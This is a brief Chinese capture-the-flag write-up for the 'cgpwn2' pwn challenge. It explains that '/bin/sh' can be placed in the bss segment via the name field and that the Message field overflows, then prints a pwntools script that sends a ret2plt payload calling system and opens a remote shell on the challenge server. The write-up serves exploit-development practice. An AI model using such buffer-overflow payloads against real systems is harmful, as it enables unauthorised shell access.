# WP-GCPWN2

两个输入 *name* 和 *Message*

![lmeLx0](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/lmeLx0.png)

- name会写入bss段，所以直接写/bin/sh
- 写入Message的地方存在一个溢出，直接执行system

 ```python
#!/usr/bin/python
from pwn import *

#p=process("cgpwn2")
p=remote("111.198.29.45","56863")
#context.log_level='Debug'
#gdb.attach(p,'b *0x08048603')

sys_got=0x0804a01c
sys_plt=0x8048420
bin_sh=0x804a080

p.sendline("/bin/sh\x00")
payload=p32(sys_plt)+p32(0)+p32(bin_sh)+p32(0)+p32(0)
p.sendline("B"*0x2a+payload)

p.interactive()
 ```

![oEZaI0](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/oEZaI0.png)